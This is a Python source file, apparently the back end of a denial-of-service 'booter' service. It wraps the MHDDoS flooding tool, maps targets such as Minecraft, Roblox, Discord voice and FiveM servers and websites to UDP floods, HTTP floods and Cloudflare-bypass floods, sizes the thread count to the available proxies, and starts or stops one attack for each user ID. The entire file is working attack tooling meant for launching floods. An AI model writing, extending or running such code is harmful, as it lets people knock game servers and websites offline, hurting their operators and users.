# mhddos_engine.py
"""
MHDDoS engine — เรียก start.py เป็น subprocess
Layer 7:  python3 start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
Layer 4:  python3 start.py <method> <ip:port> <threads> <duration>
"""
import asyncio
import sys
from config import MHDDOS_PATH, PROXIES_PER_DEVICE


# module → (layer, method, extra)
# layer 7 = web, layer 4 = network
MODULE_MAP = {
    "minecraft":  ("L4", "MCBOT",     {}),
    "roblox":     ("L4", "UDP",       {}),
    "discord":    ("L4", "UDP",       {}),   # voice channel = UDP
    "fivem":      ("L4", "FIVEM",     {}),
    "web":        ("L7", "CFB",       {"rpc": 64}),   # web → Cloudflare bypass default
    "web_bypass": ("L7", "BYPASS",    {"rpc": 64}),
    "web_stress": ("L7", "STRESS",    {"rpc": 64}),
    "http_flood": ("L7", "GET",       {"rpc": 128}),
}


class MHDDoSEngine:
    def __init__(self, proxies_path: str = "data/proxies.txt"):
        self.proxies_path = proxies_path
        self.running: dict[int, asyncio.subprocess.Process] = {}  # user_id → proc

    def _build_cmd(self, module: str, target: str, port: int, duration: int, devices: int):
        info = MODULE_MAP.get(module)
        if not info:
            raise ValueError(f"unknown module: {module}")

        layer, method, extra = info
        threads = max(100, devices * 50 * PROXIES_PER_DEVICE)
        rpc = extra.get("rpc", 64)

        if layer == "L7":
            # L7: <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
            host = target if target.startswith("http") else f"http://{target}"
            if port and ":" not in host.split("//")[-1]:
                host = f"{host}:{port}"
            return [
                sys.executable, MHDDOS_PATH,
                method, host, "5", str(threads),
                self.proxies_path, str(rpc), str(duration),
            ]
        else:
            # L4: <method> <ip:port> <threads> <duration>
            host = target.split("//")[-1].split("/")[0]
            if ":" not in host:
                host = f"{host}:{port}"
            return [
                sys.executable, MHDDOS_PATH,
                method, host, str(threads), str(duration),
            ]

    async def start(self, user_id: int, module: str, target: str, port: int,
                    duration: int, devices: int) -> asyncio.subprocess.Process:
        if user_id in self.running:
            raise RuntimeError("มี attack รันอยู่แล้ว")

        cmd = self._build_cmd(module, target, port, duration, devices)
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        self.running[user_id] = proc
        asyncio.create_task(self._reaper(user_id, proc))
        return proc

    async def _reaper(self, user_id: int, proc):
        await proc.wait()
        self.running.pop(user_id, None)

    async def stop(self, user_id: int):
        proc = self.running.pop(user_id, None)
        if proc and proc.returncode is None:
            proc.terminate()
            try:
                await asyncio.wait_for(proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                proc.kill()

    def is_running(self, user_id: int) -> bool:
        return user_id in self.running